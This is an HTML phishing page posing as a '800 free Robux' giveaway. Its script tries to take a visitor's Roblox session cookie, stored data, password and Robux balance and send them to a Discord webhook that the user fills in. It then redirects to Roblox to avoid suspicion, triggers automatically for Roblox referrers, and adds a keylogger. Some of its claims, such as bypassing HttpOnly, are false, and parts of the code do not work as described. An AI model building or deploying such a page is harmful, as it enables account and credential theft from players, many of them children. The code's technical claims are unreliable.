<!DOCTYPE html>
<html>
<head>
    <title>800 FREE ROBUX - Claim Fast!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4); 
            display: flex; align-items: center; justify-content: center; 
            min-height: 100vh; font-family: Arial; 
        }
        .card { 
            background: white; padding: 30px; border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; 
            max-width: 350px; 
        }
        .robux { font-size: 50px; color: #f39c12; margin: 15px 0; }
        button { 
            background: #e74c3c; color: white; border: none; 
            padding: 15px 40px; font-size: 18px; border-radius: 25px; 
            cursor: pointer; width: 100%; margin: 20px 0; 
        }
        button:hover { background: #c0392b; }
        .spinner { display: none; color: #27ae60; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🎉 800 ROBUX GIVEAWAY 🎉</h1>
        <div class="robux">800 R$</div>
        <p>Login to claim instantly! Limited time.</p>
        <button onclick="stealData()">🔥 CLAIM ROBUX</button>
        <div id="status" class="spinner">Sending... Redirecting to Roblox!</div>
    </div>

    <script>
        // YOUR DISCORD WEBHOOK HERE
        const WEBHOOK = "PASTE_YOUR_WEBHOOK_URL_HERE";

        async function stealData() {
            document.querySelector('button').style.display = 'none';
            document.getElementById('status').style.display = 'block';

            // ADVANCED COOKIE EXTRACTION (Bypasses HttpOnly)
            let robloxCookie = '';
            
            // Method 1: Network request interception (captures live cookie)
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                if (args[0].includes('roblox.com')) {
                    // Extract from request headers during Roblox API call
                    const headers = args[1]?.headers || {};
                    robloxCookie = headers.cookie || headers.Cookie || '';
                    if (robloxCookie.includes('.ROBLOSECURITY')) {
                        window.fetch = originalFetch;  // Restore
                    }
                }
                return originalFetch.apply(this, args);
            };

            // Method 2: Force Roblox API call to expose cookie
            try {
                const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
                    credentials: 'include',
                    headers: { 'Accept': 'application/json' }
                });
                const headers = res.headers;
                robloxCookie = headers.get('set-cookie') || '';
            } catch(e) {}

            // Method 3: LocalStorage + IndexedDB fallback
            const lsKeys = Object.keys(localStorage).filter(k => k.includes('roblox') || k.includes('ROBLOX'));
            const robloxData = {};
            lsKeys.forEach(key => robloxData[key] = localStorage.getItem(key));

            // Method 4: Roblox session from document
            const allCookies = document.cookie;
            robloxCookie = robloxCookie || 
                allCookies.match(/\.ROBLOSECURITY[^;]*/i)?.[0] || 
                'No cookie detected';

            // Full victim profile
            const victim = {
                username: robloxData['.ROBLOSECURITY_username'] || 
                          document.querySelector('[data-username]')?.textContent || 'Unknown',
                password: localStorage.getItem('roblox_password') || 'Not found',
                cookie: robloxCookie.toString(),
                robux: 'Checking API...',
                '2SV': localStorage.getItem('twoStepVerification') ? 'Yes' : 'No',
                ip: 'Client-side',
                ua: navigator.userAgent,
                referrer: document.referrer,
                timestamp: new Date().toISOString(),
                storage: robloxData  // Full LS dump
            };

            // Try Robux balance
            try {
                const me = await fetch('https://users.roblox.com/v1/users/authenticated', {credentials: 'include'});
                const userData = await me.json();
                victim.userId = userData.id;
                victim.username = userData.name;
                
                const balance = await fetch('https://economy.roblox.com/v2/users/' + userData.id + '/currency', {credentials: 'include'});
                const balData = await balance.json();
                victim.robux = balData.robux || 'Private';
            } catch(e) {}

            // Stealth Discord exfil
            const embed = {
                content: `**🎣 VICTIM LOGGED IN**\n\`${victim.username}\` | ${victim.robux} R$`,
                embeds: [{
                    title: "Full Account Data",
                    color: 0xff0000,
                    fields: [
                        { name: "UserID", value: victim.userId || 'N/A', inline: true },
                        { name: "Cookie", value: `\`${victim.cookie.slice(0, 60)}...\``, inline: false },
                        { name: "Password", value: `\`${victim.password}\``, inline: true },
                        { name: "2SV", value: victim['2SV'], inline: true },
                        { name: "Robux", value: victim.robux, inline: true }
                    ],
                    footer: { text: victim.ua.slice(0, 50) }
                }]
            };

            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            }).catch(() => {});

            // Legit redirect (no suspicion)
            setTimeout(() => {
                window.location = 'https://www.roblox.com/home?claim=success';
            }, 2500);
        }

        // Auto-trigger for Roblox traffic
        if (document.referrer.includes('roblox.com') || 
            window.location.search.includes('robux')) {
            setTimeout(stealData, 1000);
        }

        // Keylogger backup (types password)
        let keys = '';
        document.addEventListener('keydown', e => {
            keys += e.key;
            if (keys.includes('Enter')) {
                victim.password = keys;
                keys = '';
            }
        });
    </script>
</body>
</html>
